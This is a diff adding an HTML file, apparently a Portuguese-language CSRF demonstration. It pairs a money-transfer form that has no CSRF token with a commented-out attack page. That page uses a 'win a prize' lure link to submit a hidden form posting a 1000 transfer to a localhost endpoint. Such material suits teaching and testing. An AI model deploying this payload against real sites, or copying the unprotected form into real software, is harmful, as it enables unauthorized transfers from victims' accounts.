@@ -1,0 +1,34 @@
+<!--CÓDIGO OFICIAL-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transferência</title>
+</head>
+<body>
+    <h1>Realizar Transferência</h1>
+    <form action="/transfer" method="POST">
+        <input type="number" name="amount" placeholder="Digite o valor" required>
+        <button type="submit">Transferir</button>
+    </form>
+</body>
+</html>
+
+<!--CÓDIGO DE ATAQUE-->
+<!--<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>Click Here!</h1>
+    <a href="#" onclick="document.getElementById('csrfForm').submit();">Clique aqui para ganhar um prêmio!</a>
+    
+    <form id="csrfForm" action="http://localhost:3000/transfer" method="POST" style="display:none;">
+        <input type="hidden" name="amount" value="1000">
+    </form>
+</body>
+</html>-->
